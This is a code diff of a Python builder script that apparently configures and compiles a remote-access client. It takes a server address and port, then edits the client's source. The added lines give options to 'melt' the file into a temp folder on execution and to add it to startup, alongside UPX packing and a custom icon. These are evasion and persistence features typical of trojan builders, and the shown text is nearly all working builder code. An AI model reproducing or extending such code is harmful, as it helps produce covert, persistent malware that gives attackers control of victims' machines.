@@ -23,6 +23,7 @@ print("1. Use: " + strCurrentIP)
 print("2. Use a different IP address for server")
 print("3. Use a DNS Hostname")
 
+strChoice = ""
 strChoice = input("\n" + "Type selection: ")
 
 if strChoice == "1":
@@ -34,7 +35,6 @@ elif strChoice == "3":
 else:
     print("Invalid Choice!")
     sys.exit(0)
-
 
 strPort = input("\n" + "Enter port number (Press ENTER for default): ")
 
@@ -105,6 +105,51 @@ objClientFile = open("client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
+
+strMeltChoice = input("\n" + "Melt file on execution to tmp folder? y/n: ")
+
+objClientFile = open("client.py", "r")
+arrFileContents = objClientFile.readlines()
+objClientFile.close()
+
+if strMeltChoice == "y":
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:13] == "blnMeltFile =":
+            arrFileContents[intCounter] = "blnMeltFile = True" + "\n"
+            break
+else:
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:13] == "blnMeltFile =":
+            arrFileContents[intCounter] = "blnMeltFile = False" + "\n"
+            break
+
+objClientFile = open("client.py", "w")
+objClientFile.writelines(arrFileContents)
+objClientFile.close()
+
+
+strAddToStartup = input("\n" + "Add program to startup on launch? y/n: ")
+
+objClientFile = open("client.py", "r")
+arrFileContents = objClientFile.readlines()
+objClientFile.close()
+
+if strAddToStartup == "y":
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:17] == "blnAddToStartup =":
+            arrFileContents[intCounter] = "blnAddToStartup = True" + "\n"
+            break
+else:
+    for intCounter in range(0, len(arrFileContents)):
+        if arrFileContents[intCounter][0:17] == "blnAddToStartup =":
+            arrFileContents[intCounter] = "blnAddToStartup = False" + "\n"
+            break
+
+objClientFile = open("client.py", "w")
+objClientFile.writelines(arrFileContents)
+objClientFile.close()
+
+
 strUPXChoice = input("\n" + "Use UPX? y/n (Decreases file size but may not work on fresh computers): ")
 
 if strUPXChoice == "y":
@@ -116,7 +161,6 @@ else:
         shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")
     except:
         pass
-
 
 strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")
 
